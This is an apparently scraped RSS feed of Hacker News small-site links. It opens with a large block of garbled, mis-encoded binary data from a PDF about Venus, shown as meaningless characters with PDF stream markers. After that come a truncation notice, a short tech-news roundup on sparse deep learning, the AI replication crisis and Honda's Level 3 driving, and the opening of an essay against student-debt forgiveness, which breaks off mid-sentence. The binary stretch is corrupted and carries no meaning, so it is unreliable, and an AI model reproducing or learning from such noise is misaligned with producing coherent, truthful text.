‚Ä∞*√çQy‚Ñ¢√∂¬¥√ì,√≥¬∫t^√Än_√ö	\√±√ßy√©&nbsp;[¬•_‚Ä†¬¶qL5≈Ω‚Äû¬´K‚Äû‚Äù,&lt;√è02]≈Ω`L%√ë√¢¬ß√±ÔøΩ&gt;t¬ß√É‚Äör[¬ª:X!S@v@¬´¬∏‚Äπ√ï'|√≠‚Ç¨¬º‚Ñ¢L√§l‚Äì‚Ä¢g¬™b¬Ω&nbsp;¬•B‚ÄúÔøΩ√∂≈ì`¬µ√é‚ÄùCw√™YQ √ñ¬Æ≈°iBÀú<j2√∫√æl≈í√Æ‚Äú¬æd√∞≈í‚Ä†√¶√∞bnt√•l5l√©,√≠i0¬µ(√Ω¬£√ß√≥1}√èy‚Äπ√µ √≠‚Äì√µy√¶¬©^ae√è="">/=√´CSÔøΩ√¢√§√êi[‚Ä†
¬ß‚Äú¬æd¬∫	‚Äú&nbsp;√ÄF‚Ä¢≈∏hjKI√¨‚Äû≈íÔøΩt√ü√Æ√Å¬ßK‚Äò/]q√ë&lt;¬§a‚Ä∞¬™K√∏M‚ÄùH#1&gt;ÀÜ4¬∞‚Ñ¢¬®VÔøΩ√ë√É¬¶√Éu√∫¬ºi‚Ä¢;¬¥s√è4&amp;f6√ë√ú¬¢¬¥+¬º√∞¬æ$¬¨√ótgÔøΩ#0√Öaxs0c√∫%I¬∫J#√á√Øt{‚Äì¬æM√ò‚Ñ¢[¬¥¬´"‚Ä¢‚Ç¨¬°√ì`&amp;D[√°√®‚Äπt‚Äù1D5^(#¬ø‚Äπ√ó,√ΩÔøΩ√ç¬•∆í√±u¬ø√®‚Äî√≠‚Äôy/√¥zOh√ø¬¥j‚Ä∞7≈°F"‚Ä¶√¶√ú|¬ß√ä‚Ä†	√§‚Äò≈ìÔøΩYQ‚Ä∞√î√Ω√òiox√∂ÔøΩ‚Ä¶√ã6√ãKTÔøΩ√µ¬¥‚ÄûK¬£√ó≈†z√ÇÔøΩ√ã√ÆAL‚Äπ√üDT√ø\9¬¶√ÉÔøΩ3√í√î√£‚Äú0√ä√∏W¬ª{7d=R"LÔøΩX √ßE√®
‚Ä†√¢¬π
u¬ßq√¥¬π√ãh√Ç&gt;z√∫
¬Æ¬º¬∏t√∫√ªJ√ìj¬∂√≠¬ΩW√º&nbsp;k√à4√≤√ê¬≤J:√ô≈Ω¬≠7¬©¬∞2f√¥√ø;0√à√ë√ì≈íoiN|¬§ÔøΩN
hÔøΩ&amp;v√§‚Ä¢¬¨√ØrÔøΩÔøΩp√ëW/‚Ç¨t¬¢L]
≈í√™√£¬•@O√Ä√ü√É√ê¬∞‚Äπy√†3&lt;√Ä√¥:~R√ãD‚Ä¢Ur√®‚Ä†√¥¬ÆwjK≈∏√î√¶\√ã‚Äî‚Ä¶≈∏&lt;{√™√¢√∫√Å≈í√Æ‚Ç¨√é√ã√°¬±A|6h#√ìw5√Ä¬™√è√â‚ÄòÔøΩ√†¬π‚Äπ√®(ÔøΩ√®EdPÔøΩ;¬∏‚Äò√û¬Æ√ì	t‚Ä°E√°√Ç√Ä√©√ì ‚Ä†F¬∑~
¬≠‚Äπ‚Äö¬ªK√õ√Ä
√ñ‚Ä∞√ï√Ç√±√®√Ω√µ¬ºTc√ï&nbsp;G≈°
√µKrB¬£√ü+L\EwÔøΩ(√ó√ì7&lt;√©√ùr9 :ÔøΩ
,√é‚Ä°e!√ú√ß√Å√∂¬ª√ùI√Ω.√è‚Ä°√†√é|¬Æ√©‚Äô√ø√∞√¥√òOÀújv√ø!-8&gt;√í√¥√∏C√á√áP,5N&lt;√´‚Ç¨n"I√¥√ßÔøΩxe≈†√Ü√æ√çB√ó√Å¬∑¬£√à¬∏L≈ì¬∞√Ü√Ω‚Ä†&nbsp;√ó+f√ßJ+Uo√†h√ä4√û√Éh‚Ä∞√ó‚Äπ√ú‚Ä¶"≈Ω√µ√Ö√∫‚Ä∞‚Ä∫√º
¬≤¬§√´¬™
.√´F‚Ñ¢VAc¬∂∆í√ü√ªK+√ò√¶√ä√≥√®ÔøΩ∆í#U¬§¬≥√Ø≈æ‚ÄìA2√∞t¬µ√ë;s¬∂[√∞¬∫Q≈æ
c
%¬≥W≈Ωb¬¥√íFc6√¥^√á|¬•¬∏√Ñ5‚ÄúI}√∫∆íH&nbsp;√éÔøΩ√ì¬°~√Æ1	{≈∏j\¬™√ÄG≈∏‚Äú[‚ÄúvI√≥_I√´¬∑√®√è(Gua√¢√™¬•-√Ø√ãL)9√≤2ÀÜ≈íx‚Ä∞&gt;~√Ép&lt;√é√¶‚Äö√îf√ºn√Ç√Ñ‚Äô|‚Äù√Å‚Äù√§¬£/¬≠Vg¬£¬≤√Ø
v‚Äù‚Ä°G√ü√§√çW√í≈æ√≠K√ô‚Ä∫f√è¬¢√åT¬≠√ç√â¬∞(x‚Äú¬´‚Äî¬≥}√â¬µ√ê¬§√®yTJkvs√´√¶^√ìdU`√Å√∑ÔøΩ‚Ä∫W&amp;¬™¬¢nxh√ù(K¬°√É‚Ä†¬ÆZ√ì¬•w¬∫¬£dJr√≥1‚Ñ¢√©¬¥√Å~"¬∞iWe√£k¬≠3*eib¬Æ√óQ√§√∂‚Ä∫d¬≤hhx√è¬¶*¬ª'¬π(L¬≤√êw[
¬©√å¬•9Gq√ñ√∞√£≈†√ïÔøΩ]&nbsp;√∏¬ºÔøΩ‚Ä∞√ΩÀú‚Äô√´¬ø√≠-Zl√Ω≈°EV√óe]≈†√≠√Å¬∫b√ªÀÜ√ß
D¬∏^=
h√©-¬¢‚Äî√ê&nbsp;M√≥¬§r√¶√∂x√Ñ2¬¥√≠√á√∞√§∆í
√ã√∞√°√ûX‚Ä†≈∏~ÔøΩ√°ÔøΩe√∏√®∆ío,√É√è&gt;√à√∞√Ü2|√ºA‚Ä†7‚Äì√°√ßd¬∏≈æwÔøΩ√Ø¬≠+√É¬Ø√ß√ç√õ¬ª‚Ä¶√†√∂√Æ~Y√®¬∂,√∫nP≈æwI√Ωu.Y‚Äú√ÉJS√Øz√≥¬π√πtv¬µ√Ø‚ÄûÔøΩ¬©√ù¬∂∆í√ßM‚Ä∞bJtÀÜ¬º√ìN\y√©√§√ä¬•D¬°¬®&amp;L/√∞¬≥√ô√ç√∏‚Äû=√ôw&lt;¬Ø√õ√†Wx!√±¬°√´Ebr¬±√ª√¶√û√§√ç¬£√ú√û‚Ä∫√≠g‚Ä∞√¥√á¬§dZ‚Äò√ã√ä¬æ√él¬∂√Ö√ñf\¬ª%√ç√ô√Å√õ=‚Äú¬±¬®√Æ¬´‚Ä∫0√í√Ø√è-h[¬©VB√ñ¬Ω:√§√í√ô¬π~¬§G≈æo&gt;‚Äù&gt;¬≤\¬ß‚Äû≈†√É	√°,√¨
¬§[√Ä¬´√Ñ‚ÄûN¬≠√Ñ√õ¬Ø¬∫√¥√£≈æ√π1p¬∑[√àj‚Äî√∏‚Äô3√ág7!ÔøΩ¬ß√ê√æ√ò|‚Äò&nbsp;√ø¬™uPE¬∞s‚Ä∞E√ÅtP¬∞o√ú¬¶¬∏¬ß√∂S√ô4\‚Ä∞√í≈∏√Å9√å√†¬•3M≈ì√òO_I√Ö*‚Ñ¢√ï√ç√∑¬∂¬¶¬∏¬®√ùu]T√ß[¬∏¬Æ√®¬∏¬®]h?≈°;√†U"√ó√∞√¨b{¬πÔøΩ7¬æ¬™¬™K1√ì*√áy≈æW¬∫Q√•ys√©√Æ‚Äî¬µ√ä*‚Äì√âY√Ö¬´¬¨√π¬¨U6√Ωo≈†¬°√ÆwS,√ó√ëE√Ü+¬©√ö?)f¬´≈í‚Äöq√¶;D¬©ÔøΩÔøΩ‚Äú¬´√ßR4G&lt;√©‚Ä¶¬•√áN`√ó∆íÔøΩ≈æ+,‚Äû√®√ù¬∑√´y,`p_]z&amp;¬∑√ù¬¨¬•√£wE√è√ºR¬ºv&lt;`√∞√Éx@¬£√≤√≠¬¥9√´√ê√í√±AT~√¥)1¬Ω√µR√úy¬©√ß√∞√®yl¬πf√®√âbS¬¥√≠n¬•Bx3≈æ¬≤√îF¬°¬≠=√∞√â0r√ëw`¬¥‚Äû√Æ/√©¬≠¬¶√ê√ç√ã≈†¬π:√•ÔøΩ:EoT
¬Ωi√ë‚Ä¶!¬Ω≈°(√üK√∞√ú)¬∫]n√öHi√Ä√Ö"K√ú‚Äû√£*=q√ª¬Ω√ß√Æ√°√ΩeE√±¬æ¬¢√∂ÔøΩ9¬¥√Ç	@√ï√ÇWe√á√ú‚Äô&lt;‚Ä°√æsh¬∑√∏]√à‚Äô¬¥T3¬±√õ&nbsp;¬¨¬Ω√∞‚Ä°m√éÔøΩ√ßPÔøΩR√à√πv√ûQ√Å=	&nbsp;¬¨‚Ä∞8√á√å¬Ω?Gacl¬∂_k¬§`P¬¥√Å≈Ω√±*ÔøΩ≈Ω√ß√ús¬≤≈æFÔøΩZ√°√Æ√πV√úv√Å¬¨U√Ä.√ö*K‚Ä°¬∂¬º√∂‚Äú¬´√ù‚Äì√æ√è√ê,?K‚Äû¬º√∑¬¢√Ç¬∂¬£√ò√õ‚Äû≈†O]/√Æ2¬∂¬Ø‚Ç¨9f;Qq√ñ‚Äôx√Åz√Ø*≈°√ø‚Äû{√øfendstream
endobj
1201 0 obj
4716
endobj
1211 0 obj
&lt;&gt;
stream
x≈ì¬Ω][ÔøΩ√ú√Ü¬±¬≤/'‚Ä∫√í√ä¬∫√Ü√é√Å&lt;√∏√Ñ√öXK¬≥√ô√¨√≥H√öYI√ëz/√í≈Ω,√©)'	√Ä≈ì√º √ùl‚Äô√ΩuW59¬≥+√¨U¬¨¬æ√ï√•¬´G?¬≠√™J¬¨j√øg√∏√ø≈∏√ú√ø√Æ√ú¬¨√æ√∂¬Ø√Ω≈∏√∂√´‚Ä¢¬©D√ùI¬ªRÔøΩ¬™W¬∂m≈°√äv¬´√æeu√µ√ª√ï?√∂√Ö√ä√ø√π√ß√ü√∂√Ω{=‚Ä¶l≈í√ñ√Æ√Ø√∑√ø√ä&gt;;√´y≈†¬∂√íu√ó≈Ω&lt;‚Ä¶¬™$√ã√ì√ë)SK&nbsp;k√•√à√õ√ø√ù¬¥.¬£;]√ï2√é[{Ft≈Ω¬±Z	¬≠e√ï¬∏7¬§¬≠L√ßv√îvÔøΩ√®√±O√ª"√ê√ø√ª√≥ÔøΩ¬´√ø¬ªt√ª√Æ¬µ¬∫√™¬¨¬≤¬´√ã¬ø√Æ‚Ä°∆í+#¬™√és4¬∫v+¬´√ã√∑?&lt;¬π¬µ&gt;t¬§¬≤√¢√â¬≠‚Ä°G¬≠¬™t√ó=¬πu√°≈∏6Z¬©'¬∑√é#√Å¬ªH¬∞≈æ√™'¬∑√û√ô¬™√ñ¬™3‚Äò‚Ä∫{|p¬®*¬°m√ù&gt;¬π¬µ√ß‚Ä°¬≤i√≠‚Äú[√∑#&lt;√Ω√æ√∞H√â√äh7√ù√ãHp7r‚Äö√Åt√Ä√¢$≈∏‚Ä°√Ök‚Äò¬Æm/R≈ì√Ñ√∑^
SIm√ú|√Ø√£√∂√ñ√¨2ÔøΩ√É√ì√ö¬≠√¢Y~√º8¬ºg¬∫xD~√û‚Äù¬™Kf!¬∫≈Ω√ãx<l√Ä==‚Äπ√ì√†{√Ä√ñ¬¥≈Ω√Éa√ü¬¶¬∂√âc ‚Ä†√Ö="√ã≈æ‚Ä†!‚Äπ0≈∏l√º*">]¬æ√úw¬ßQ√ïm√£√Ñ√™√≤√ø¬Ω¬Ω√°√∑t√Ç√éÔøΩ;¬Ω≈†√ß√º√™yv√ã√Ñ‚Äòb3√ßi&lt;7ÔøΩ(`6≈ìwc¬¶√ª!N1√ú¬∂¬©k‚Äò√¢:‚Äô√á!&lt;'4M√Ç√ªvd¬´‚Äö¬≥¬∞z√ø0√ö√ª√∏√î√ü√é√ëx=G√é√ét√ñ¬®√°‚Äì-∆í‚ÄìI¬π¬§eDq√éy¬∞√áR≈ì√Ö!¬ØZ¬Ø√¢Sx¬≠`e`A√èXnH√å¬®^%¬∂+"¬∞F√äv√òp√Æs2.√¥d√¢√ß&lt;√é\‚Ä°^√Ö√á√ß√º¬¢y√Ør=√§√¥&gt;h¬ªc√§&lt;√û¬®√≠DÔøΩ√É‚Äπp√ê√π‚Äû¬Ω√≤‚Ä∞Z8√ûr√î√ûSi√ß
√õV{O√ï√®¬™i≈íY¬µ√é√â√©√ñ√ì√ùw√Ø5‚Ä¢¬∞n#√∑√¢√∞~√§¬æ√Æ¬®1MU7√Ç‚Ä∞~W¬µVj√è√ÉOw√π√∑}¬©¬™√é]x¬Æ√¶√∞√à√É√ì√âD
√ó√ë‚Ä∞‚Ç¨¬∏√±¬≤y%D≈í√©¬≤√∏¬ØYUy√è2C√°√éU,,√¥x√ç^=√ú√ö≈í√Ω√©o
H]√Ü	1‚Ä°≈æ√†w√Ä√ñ{ÔøΩ¬∞√†5if¬¢StmE¬≤&nbsp;cV5&gt;ÔøΩ√º¬Æ9W‚Ä∫√ô+∆í2‚Ä¢¬±rR‚Ä†¬ªqi√î|√¶N√©t√≤¬£√ß√¨√ä√û$A√ºx‚Ä†√ô¬´√â≈ì√Ñ√ã√®E'¬®$u3a√∏f‚ÄìHJ√∞3ÔøΩ√õ¬Æ‚Äô¬πFÔøΩ69‚Ä¢√ÑQ¬§√†R¬π√Å.√õ¬π^w√â¬™√Æ≈°q1¬Ω√Æ‚Ç¨z‚Äö"≈ægz≈æ/)"√è¬Ø¬°"‚Äöz¬æ√¥^&gt;]‚ÄöZS√±√õ¬æ‚Ä∞√É√ºTsK√ê√à¬ø!√íK"/√∑√Ør8J√±¬¥l√Æ√É√∞√•‚ÄôVG,i5)o"√† √ñ,_*H√†ÔøΩ;~¬øÀÜ¬§√°¬¨a¬Ω¬∞cÀú√ç√õ≈°¬º‚Äî√É√áe¬≠√¶m√ù&amp;‚Ç¨√æ‚Ä†a√ìq2√∞-h√µ¬µ_B√Ö%¬øÔøΩ¬±√∞T√ì√≠√Åp‚Ä¢‚Ñ¢=x√¶¬®√£"√∫D‚Äò√Ñ&nbsp;kJ&nbsp;¬∑√ê√∂√úqE√Ω|¬±√§¬¢√π√Ä‚Äù√á‚Äò¬º√´‚Ä°E√¶rI √Ö√¨.2¬≠DP√á√´√ü‚Ä†‚Ä¢}¬∏d&gt;^|Q0¬º√¢¬¢KX(o¬¢√ªKbfx√Øj0	u¬•√æMb`¬´√º&nbsp;
√ãa¬±apOor|0g√Ñx√≥¬π√°√´√πd¬¢y√èKp√ê4T√å√≥√®√à_√Ü‚Äî¬±¬µÔøΩ¬¶¬≤¬∂-`kc"¬∏√∂√£&lt;¬∫‚Äì√ÜV¬≠lv@√ó_;¬¶√Ω¬±‚Ä¢√ÇHP√ó√ë‚Äô≈†4e√∫
Z√å'k‚Ç¨`F3‚Ä∞I(¬§¬∞(√∞¬ØS√≥
√∑¬Ω/ÔøΩ‚Äö√£	ÔøΩ¬∏8F√©√•R(0.√à‚Äû2D‚Äπ.¬∑ÔøΩ¬æ√¢‚Ä¢≈†ÔøΩGn√≤}¬¢k√Ä~{√ò≈°¬™¬∂M;¬¶s√Ä√ª√±"8'ÔøΩ√õ%9¬ß√õ,C$√¶√Ω.ÀÜ√ê≈íYO√ºb√ë√•#¬ºÀú¬ß{¬®‚Äîb¬¥W√π^`√≤√Ñ&gt;O√¶G‚Ä∞√†‚Ä¢√¶`}w√®√år¬≠√†¬Ω‚Äî√•&gt;¬Ω,S√å'k@;y8¬º√®√ë√πÀú≈°ÔøΩ¬ø√∫√ç√ª|p
√º‚ÄöÔøΩ1&lt;√ù¬∞|y√∑x‚ÄîUj‚Äô‚Äπ√∑≈∏√∞ÔøΩ√∑√∏‚Äπ~k√é‚Ä°√è√≥¬æ6√Å√ú¬ΩK]‚Ä∞≈Ω‚Ä¶√µ_F√ö¬Ø√¢√∞¬ø‚Ä∫¬™‚ÄòJ¬ßnp9ÔøΩ√µ‚Äö√∑√ñy¬∂#LÔøΩy‚ÄìQl‚Äî√Ö√∫√Ø√û√ìz‚Ä¢√¨)W(√¢√è?&gt;<a+≈†√Å√Å1¬¢‚Ñ¢√Æs√´≈ì%‚Ñ¢k√ô√©√ß,5ÔøΩ¬∞$√â√∫9(√ë√©jk¬Ω≈ì¬•√≥@√¢ahhg¬±√µÀú¬¶ki√¢√†*√Ü ∆í√ë√â√Éw‚Äò≈íqa√•a¬π√Å="">,√ß‚Ñ¢_¬∞∆í‚Ä°&amp;|¬≤‚Ä∫√ßÔøΩX¬ºB:ÔøΩ7<t¬∫l{!ÔøΩ¬ºaÔøΩ √µ√á;¬†x[≈æ~≈ì√ãi√Ä`√≥√Ä¬ø√ûÔøΩ‚Ñ¢‚Äúh="">S¬©hc‚Ç¨C¬¨√π√¨‚Äû√ÅÀÜi√è
¬≠√ëd‚Ä†¬Ø+√°‚ÄìÔøΩ√•YÔøΩ~√Å≈íÀÜ@ÔøΩx√≤Bl0‚Ä°HFÔøΩ√±≈ì√°!‚Äì≈Ω/XR≈∏‚Ç¨√ÖÀú¬∏-√ó¬øRv&nbsp;‚Äûk√∞‚Ä∞n√ø^¬¥_√Ñ¬°w+pÀÜ¬æ‚Ä†√ñU=√ãt√≤¬≥hm¬®‚Äù√Å[Z√ö√í1tZ¬≥k√£√Ω√°√±$H4u*||√à∆í√û√Ö\√õ¬µ√É"√±1;√§Uq√Ü=√è√•√´√í¬£aFW5B¬ß√∏‚Äû(√∂¬≤‚Ñ¢X√Ñ\hQ'√¨‚Ç¨√¨≈°¬¶KÀÜ.≈æ¬∞¬∑¬∫SÔøΩ√±:f√Ü‚Ä†√èZ¬º≈†f'√Å√Ä≈°ÔøΩ√æ1√ò&nbsp;&nbsp;√¶¬≤√ÆJ¬®√£HhU¬©V√úQw√ÆP6?~√Ñ√öh#T‚Äô√Å√∏√Ä≈°‚Äû)√Øb√ª√õ¬∏ÀÜÔøΩy√†

√∏≈∏O=√∞UÔøΩkB¬π√ï√Å≈Ω‚Äπax¬∂≈æ‚Äπ√∏‚ÄùO&lt;‚Äùx¬∂c!wv√ã‚Ä∞r¬¢¬•&gt;¬æ√ô‚Ä∞√±√ß√ï√óBÀÜÔøΩ6z¬¢]¬º√Ç√¶(yd√Ö+h≈æ,"‚Ç¨c‚Äû√ë√é!P2¬®√£&nbsp;√ò¬ß<r√ò¬• ,ÔøΩn¬º√è¬§yhv@‚Ä¢‚Äìs_-m="√¢‚Ä†peY^∆íd√≥√ªÔøΩ‚ÄôP¬©&nbsp;‚Äì:¬´T√§√ç$√ã¬Ω2A]/x≈†√≥L¬∑i{_√òÔøΩ√¢‚Ñ¢|GÀú≈°t√Ö√ô√™Y√û√â√ºÔøΩQ:√Ä√õÔøΩ.$√áÔøΩ√ükb¬æc¬Ω|!¬µ7~√ß‚Äπ√Ö¬°‚ÄôÔøΩ¬±G√ßw<ÔøΩ√†‚ÄòC‚Äî¬πxa√ê√∞√Ü¬¢ÔøΩ‚Äò.B√ìRh√ä5=Yr‚Ä†√§√≥¬¥.(¬®4√Ø√∏OY,," kqt√∏e√£‚ÄìÔøΩ¬∫8¬Ø="" 3¬¥\¬ßt¬¢y√É¬¥jÔøΩ¬©‚Äπwy√¥p#√ß~‚Äú="" √É¬∂vc‚ÄîxeÔøΩ¬µrl√ë¬°r√Æ¬¥o!="" √´√≥√∂√°√æ‚Ä∞r√ù‚Äö¬∂bd+√†‚Ä¢‚Äì'x√áe√∏"+¬ºur√òh‚Äπ√™¬≠j="`$#,√¢¬∂√òI√Ö¬®¬¥¬ßX¬∂‚Äπ;¬•Fx√µ¬æb∆í√ø√øÔøΩ√¢&quot;¬æ¬∑√¶¬µl√Ç&nbsp;">c√ß√¶1D&lt;¬º%√≥√á¬¢:e√õ‚Ä¶√ú√ÉÀú√Ü0If2√èg√∂√ô‚Ä°¬ΩÀÜ1√¢√É√Ö√ÜC^]i¬≤i≈í¬øT√π$√ò
,m¬¨qhJ?√∂@¬¥√ê√∫≈Ω√ç{|u√°‚Äù√Ö√Ø¬º√Ç√•*@l¬Ø#;wZ]√è‚Äû‚Ä¶√àAWÔøΩ√®&amp;√É√Å√´¬Øosi√î&amp;k√∏‚Äû√ÖN√æ"?b√ô$%√±9I@a!‚Ä°√ûA¬Ωg√Ω√ß¬º√•√ò03¬º
[¬®¬°√å√â√≥√∑√ê≈°√∏‚Äò¬∂Q8‚Äû√õ
,≈ìLZ]√Ä
‚Äîq¬∏a‚Ä¢‚Äô¬Ø‚Ç¨Nm√æ√ë√©¬°√ü√©¬£¬•√Ä5;¬∑_√ç√Ü
|n¬Øe.¬≥WN|¬Æ|√º¬∂√âL¬•$.:√¥5‚Ñ¢¬™√©√¢g3l¬¥√é√Ø√®9¬ø√∂√Ç√∑
Q¬æ=+√Øf	√Ém"b√Ä∆í√ß¬±√∫ÔøΩ1√ü¬ªÔøΩFACb8√£LU√πh-√ü≈Ω√à√¥√®√¶√ò‚Ñ¢√∫¬°!√ç√õ%√ä,@y√ã¬∞≈ìG&nbsp;ÔøΩSeO[‚Äön^ H¬£l6;√î √è≈∏xH√∫‚Äì¬Ø√∂√•¬®‚Ç¨&nbsp;	¬æ3√®i|ZRK&gt;B‚Ä∞}H-W √†¬ø¬ØÀÜ‚Ä¶86K,¬∂oq≈æi√ª\@
√ûk‚Ñ¢√®√üCPH‚Ç¨‚Äö¬≥√§¬±9z√≥√ÉÔøΩ:l¬¶¬°?√õ‚Ä°¬®¬∑YEY√æ|m1¬∂K√ø1√ü√Ñ¬∏Àú*√à√ÅwI√ü¬∑√é\M["√©¬™,¬æ√ºy¬≥U[~√≥ZJVg√öT¬¶‚Äπ¬ºBÔøΩ¬ª√ã√¢y ¬æ√º‚Ä¶-%√∞3√≥O‚Ä¢
√Ü√ï√è|U¬∫\x‚Äî≈íÔøΩ√º√ÄÔøΩ&amp;√ç√ì√ø¬•RP√≤Aj¬∏¬´,j√¶¬ª√´√Å)√≥M%&nbsp;√≤√∞‚ÄùWs&nbsp;¬Ω`5,‚Ä°¬π‚Äû‚Ç¨√óQ¬æ√ΩxU√É√áA√ãUH√Ö√≤h‚Äú√ØE≈æ√±√†¬Ω‚Ä†m√´√Ä‚Äú\ÔøΩ≈†v9C√ç\¬Ω√∏√ù√πb√û*¬µ√Å)¬∑√éwD¬•√ü¬≤0o≈°k$¬æ8_|√æ)√±e‚Ä†S√à¬Ø$‚Ä°k√ï√ä)H+√Ç¬∑¬¨√ÉfÔøΩ¬§¬©Zm√áN¬ªo‚Ä¶u"_√∑2v√§+√§¬∫√≠√Ö√âÔøΩMS√∑v√ºHVR√î¬∫i≈í√ê}¬≥J[Y¬°u≈∏√é√≥¬µ√≤V√∏l6∆í-sK¬¥¬∂ÔøΩ¬≠‚Äî√Ü√™&gt;')√é‚Ç¨√°1&lt;√≤x|√£√∫¬•[¬•√¢√í√≠¬¥,√ì√Ü9U
S√Ç√ühh√Ω√≥;¬™;;q4M√∫√¶3`√∏2R√†&lt;√à√∑&amp;2ÔøΩ√©¬§xwY"√â√õf0}√ë¬∏√πd=√ø1√π%z√¢f,~O&gt;√æ{¬•,r√û√ú√á¬∏V√éOAJ}y^j‚Ä¶</r√∏¬•></t¬∫l{!ÔøΩ¬ºaÔøΩ></a+≈°√°√°1¬¢‚Ñ¢√Æs√´≈ì%‚Ñ¢k√π√©√ß,5ÔøΩ¬∞$√©√∫9(√±√©jk¬Ω≈ì¬•√≥@√¢ahhg¬±√µÀú¬¶ki√¢√†*√¶></l√†==‚Äπ√≥√†{√†√∂¬¥≈æ√£a√ü¬¶¬∂√©c></j2√∫√æl≈ì√Æ‚Äú¬æd√∞≈ì‚Ä†√¶√∞bnt√•l5l√©,√≠i0¬µ(√Ω¬£√ß√≥1}√Øy‚Äπ√µ></g(x¬°¬§√¥¬øo√ø@√∂-></d√ó¬§a{!√ø@ÔøΩ√≤p%></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://venuslabs.org/Rethinking%20Our%20Sister%20Planet%20(ebook).pdf">http://venuslabs.org/Rethinking%20Our%20Sister%20Planet%20(ebook).pdf</a></em></p>]]>
            </description>
            <link>http://venuslabs.org/Rethinking%20Our%20Sister%20Planet%20(ebook).pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26198358</guid>
            <pubDate>Fri, 19 Feb 2021 21:39:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tech Tuesdays: Bob Ross and Data Science ‚Äì A Statistical Analysis]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26198300">thread link</a>) | @mooreds
<br/>
February 19, 2021 | https://bennettdatascience.com/tech-tuesdays-bob-ross-and-data-science-a-statistical-analysis/ | <a href="https://web.archive.org/web/*/https://bennettdatascience.com/tech-tuesdays-bob-ross-and-data-science-a-statistical-analysis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<div>
	<div>
		<p><strong>New Algorithm Provides 50 Times Faster Deep Learning<br>
</strong>Using algorithms derived from neuroscience, based on a principle of the brain called sparsity, A.I. research company Numenta has achieved a dramatic performance improvement in deep learning networks, without any loss in accuracy. Their breakthrough is also vastly more energy efficient. Have a read <a href="https://www.futuretimeline.net/blog/2020/11/12-deep-learning-future-timeline-algorithm.htm">here</a>!</p>
<p><strong>A.I. is Wrestling With a Replication Crisis<br>
</strong>Science is built on a bedrock of trust, which typically involves sharing enough details about how research is carried out to enable others to replicate it, verifying results for themselves. This is how science self-corrects and weeds out results that don‚Äôt stand up. Replication also allows others to build on those results, helping to advance the field. Science that can‚Äôt be replicated usually falls by the wayside, but this seems to be a growing trend in A.I. research and growing numbers of scientists are pushing back against a perceived lack of transparency. Read more about this issue <a href="https://www.technologyreview.com/2020/11/12/1011944/artificial-intelligence-replication-crisis-science-big-tech-google-deepmind-facebook-openai/">here</a>.</p>
<p><strong>World‚Äôs First Production Car With ‚ÄòEyes-Off‚Äô Self-Driving Tech<br>
</strong>Honda has received regulatory approval from the Japanese Ministry of Land, Infrastructure, Transport, and Tourism (MLIT) to begin selling vehicles equipped with Level 3 autonomous driving. In a press release, Honda shared that it would begin the sale of the Honda Legend equipped with its all-new ‚ÄúTraffic Jam Pilot‚Äù feature by the end of the company‚Äôs fiscal year (March 31, 2021). Would you give it a try? Read more <a href="https://www.thedrive.com/tech/37568/honda-launching-worlds-first-production-car-with-eyes-off-self-driving-tech-by-mid-2021">here</a>.</p>
	</div>
</div>




			</div></div>]]>
            </description>
            <link>https://bennettdatascience.com/tech-tuesdays-bob-ross-and-data-science-a-statistical-analysis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26198300</guid>
            <pubDate>Fri, 19 Feb 2021 21:34:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don‚Äôt Forgive Student Debt]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26198267">thread link</a>) | @undefined1
<br/>
February 19, 2021 | https://www.persuasion.community/p/dont-cancel-student-debt | <a href="https://web.archive.org/web/*/https://www.persuasion.community/p/dont-cancel-student-debt">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7a9f92f-a575-4f8e-82b3-956cb7864016_4400x2750.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7a9f92f-a575-4f8e-82b3-956cb7864016_4400x2750.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a7a9f92f-a575-4f8e-82b3-956cb7864016_4400x2750.jpeg&quot;,&quot;height&quot;:910,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:11767301,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>President Biden is <a href="https://www.cnbc.com/2021/02/04/biggest-winners-in-democrats-plan-to-forgive-50000-of-student-debt-.html">facing pressure</a> from some Democratic lawmakers to use executive action to forgive $50,000 of student debt for each federal borrower. After all, roughly 42 million Americans have student loans amounting to a staggering <a href="https://www.brookings.edu/policy2020/votervital/who-owes-all-that-student-debt-and-whod-benefit-if-it-were-forgiven/">$1.5 trillion dollars</a>‚Äîit‚Äôs a larger share of household debt than credit cards. </p><p>Such debt relief would help underprivileged minorities, says Senate Majority Leader Chuck Schumer (D-NY). ‚ÄúDuring a time of historic and overlapping crises, which are disproportionately impacting communities of color, we must do everything in our power to deliver real relief to the American people, lift up our struggling economy, and close the racial wealth gap,‚Äù he stated in support of the cancellation, which would cost the government around $1 trillion.</p><p>But this argument gets it exactly <a href="https://www.wsj.com/articles/canceling-student-debt-would-be-a-brahmin-bailout-11606687827">backward</a>. Large-scale student-debt cancellation would disproportionately benefit the wealthy and make an imperceptible difference on the racial wealth gap‚Äîor even make it worse.</p><p>Although more people are going to college, they are still on average better off than the non-college educated. In 2019, Adam Looney of the Brookings Institution found that presidential candidate Elizabeth Warren‚Äôs proposal to forgive up to $50,000 of debt for households who earn less than a quarter-million dollars a year <a href="https://www.brookings.edu/blog/up-front/2019/04/24/how-progressive-is-senator-elizabeth-warrens-loan-forgiveness-proposal/">would be regressive</a>, with the bottom 60% of households receiving only 34% of the 